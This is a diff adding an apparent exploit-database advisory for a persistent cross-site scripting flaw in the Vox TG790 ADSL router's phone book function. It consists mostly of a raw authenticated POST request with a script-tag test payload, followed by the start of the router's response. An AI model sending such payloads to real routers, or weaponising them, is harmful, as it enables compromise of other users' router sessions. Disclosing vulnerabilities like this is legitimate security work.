@@ -1,0 +1,33 @@
+# Title: Vox TG790 ADSL Router - Cross-Site Scripting
+# Author: Cakes
+# Exploit Date: 2018-08-01
+# Vendor: Vox Telecom
+# Link: https://www.vox.co.za/
+# Firmware Version: 6.2.W.1
+# CVE: N/A
+ 
+# Description
+# Due to improper user iunput management low privilege users are able to create 
+# a persistent Cross-Site scripting attack via the phone book function. 
+ 
+# PoC
+POST /cgi/b/_voip_/phonebook/?be=0&l0=2&l1=1&name= HTTP/1.1
+Host: 192.168.1.254
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://192.168.1.254/cgi/b/_voip_/pb/?be=0&l0=2&l1=1&name=
+Authorization: Digest username="cakes", realm="SpeedTouch", nonce="0745EHNLF:00-1D-68-52-6C-37:173934:292999", uri="/cgi/b/_voip_/phonebook/?be=0&l0=2&l1=1&name=", response="ab09b54d4b6369496463eb79cfb4b1c2", qop=auth, nc=0000002a, cnonce="8305e26a71dd0ae2"
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 141
+
+0=10&1=&100=Cakes&101=Cakes&102=123123&103=123123123&104=123123&105=123123&106=<script>altert("TESTER");</script>
+
+# Response
+HTTP/1.0 200 OK
+Cache-Control: no-cache
+Expires: -1
+Content-Type: text/html
